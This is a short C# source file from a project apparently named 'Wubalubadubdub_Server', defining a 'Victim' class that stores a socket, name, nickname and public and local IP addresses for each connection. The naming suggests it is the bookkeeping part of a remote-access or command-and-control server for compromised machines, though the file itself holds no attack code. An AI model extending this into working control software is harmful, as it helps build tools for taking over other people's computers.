using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;

namespace Wubalubadubdub_Server
{
    public class Victim
    {
        public Socket socket;
        public String name;
        public String nickName;
        public String IP;
        public String localIP;

        public Victim(Socket socket, string name, string ip, string localIp)
        {
            this.socket = socket;
            this.name = name;
            IP = ip;
            localIP = localIp;
        }

        public Victim(Socket socket, string name)
        {
            this.socket = socket;
            this.name = name;
        }

        public Victim(Socket socket)
        {
            this.socket = socket;
        }
    }
}